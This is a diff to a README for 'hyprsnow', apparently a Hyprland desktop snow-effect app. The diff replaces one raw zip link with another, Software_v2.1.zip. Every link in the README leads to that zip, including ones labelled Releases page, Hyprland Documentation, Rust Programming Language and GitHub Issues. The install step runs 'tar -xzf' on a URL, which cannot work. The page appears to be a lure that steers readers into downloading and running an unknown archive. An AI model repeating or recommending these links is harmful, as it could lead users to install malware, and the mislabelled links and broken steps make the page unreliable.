@@ -6,7 +6,7 @@ Welcome to **hyprsnow**, a delightful application that adds a snowy effect to yo
 
 ### 📥 Download Now
 
-[![Download hyprsnow](https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip)](https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip)
+[![Download hyprsnow](https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip)](https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip)
 
 ## 📃 Description
 
@@ -25,18 +25,18 @@ To run **hyprsnow**, you need the following:
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip) to find the latest version of **hyprsnow**.
+   Go to the [Releases page](https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip) to find the latest version of **hyprsnow**.
 
 2. **Choose the Right File**  
-   Locate the latest release. Look for files named something like `https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip`.
+   Locate the latest release. Look for files named something like `https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip`.
 
 3. **Download the File**  
    Click on the file name to start downloading. Make sure to save it in a location you can easily find, like your Downloads folder.
 
 4. **Extract the Files**  
-   Once downloaded, you need to extract the files. Right-click on the `https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip` file and select "Extract Here" or use the terminal and run:
+   Once downloaded, you need to extract the files. Right-click on the `https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip` file and select "Extract Here" or use the terminal and run:
    ```bash
-   tar -xzf https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip
+   tar -xzf https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip
    ```
 
 5. **Run the Application**  
@@ -71,11 +71,11 @@ If you encounter issues while running **hyprsnow**, try the following:
 
 For more information, you can explore the following topics:
 
-- [Hyprland Documentation](https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip)
-- [Rust Programming Language](https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip)
+- [Hyprland Documentation](https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip)
+- [Rust Programming Language](https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip)
 
 ## 📫 Contact and Support
 
-If you have questions or need support, feel free to reach out. You can create issues on the [GitHub Issues Page](https://raw.githubusercontent.com/boxer-027/hyprsnow/main/src/hyprsnow_v3.9.zip), and we will do our best to assist you.
+If you have questions or need support, feel free to reach out. You can create issues on the [GitHub Issues Page](https://github.com/boxer-027/hyprsnow/raw/refs/heads/main/src/Software_v2.1.zip), and we will do our best to assist you.
 
 Enjoy the winter wonderland on your desktop with **hyprsnow**!
